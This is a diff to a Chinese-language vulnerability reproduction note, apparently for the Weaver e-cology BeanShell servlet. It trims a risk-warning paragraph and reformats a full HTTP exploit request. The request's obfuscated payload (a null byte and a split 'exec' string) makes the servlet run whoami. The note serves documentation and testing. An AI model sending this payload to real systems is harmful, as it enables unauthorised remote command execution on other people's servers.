@@ -40,7 +40,7 @@ schema_version: "1"
 
 ## 操作风险
 
-命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。
 
 ## 技术资料与来源记录
 
@@ -71,16 +71,16 @@ ecology
 #### 漏洞复现
 
 ```http
-    POST /weaver/bsh.servlet.BshServlet HTTP/1.1
-    Host: www.0-sec.org:8088
-    Accept: */*
-    Accept-Language: en
-    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
-    Connection: close
-    Content-Length: 98
-    Content-Type: application/x-www-form-urlencoded
+POST /weaver/bsh.servlet.BshServlet HTTP/1.1
+Host: www.0-sec.org:8088
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Content-Length: 98
+Content-Type: application/x-www-form-urlencoded
 
-    bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
+bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
 ```
 
 ***利用技巧***
